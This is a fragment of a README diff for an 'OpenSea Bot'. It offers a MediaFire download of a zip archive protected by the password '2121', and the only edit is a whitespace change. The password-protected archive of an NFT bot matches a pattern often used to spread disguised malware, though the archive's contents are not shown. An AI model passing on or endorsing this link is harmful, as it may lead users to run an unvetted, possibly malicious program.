@@ -3,7 +3,7 @@
 ***DOWNLOAD BOT*** :arrow_heading_down:
 |[Click to Download](https://www.mediafire.com/file/0g30n3lwxgvcqbq/OpenSea+Bot.zip/file)|Password: 2121|
 |---|---|
-
+ 
 ```
 Supported operating systems: Windows 10 (64 Bit) | 2004 - 21H2
 Supported processors: Intel & AMD (64 Bit) 
